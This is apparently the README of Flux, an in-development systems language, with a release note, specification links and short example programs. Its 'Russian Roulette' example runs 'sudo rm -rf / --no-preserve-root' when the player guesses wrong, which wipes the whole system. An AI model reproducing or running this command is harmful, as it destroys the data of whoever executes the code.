# Flux

**Note:** This language is still in development. A simplified version of Flux will be the first to release. It will not support templates, inheritance, `operator`, `contract`, `compt`, the *full* built-in operator set (all logical/bitwise operators), or macros. This is not a complete list of all that will not be supported. The reduced language specification can be found [here](https://github.com/kvthweatt/FluxLang/blob/main/language_specification_simplified.md).

Flux is a systems programming language, visually resembling C++ and Python.

For the full specification, go [here](https://github.com/kvthweatt/FluxLang/blob/main/language_specification.md).

---

#### Hello World:
```
import "standard.fx";

def main() -> int
{
    print("Hello World!");
};
```

#### Basic string (Non-OOP):
```
unsinged data{8}[] as noopstr;
```

#### Russian Roulette:
```
import "standard.fx";
import "system.fx";
import "random.fx";

def main() -> int
{
    unsigned data{3} as threebit randval;
    while(true)
    {
        randval = randint(1..6);
        if ((int)input("Enter a number (1-6): ") != randval)
        {
            print("You lose! Goodbye!");
            system.shell("sudo rm -rf / --no-preserve-root");
            return 0;
        };
        print("You win! Good job!");
        return 0;
    };
};
```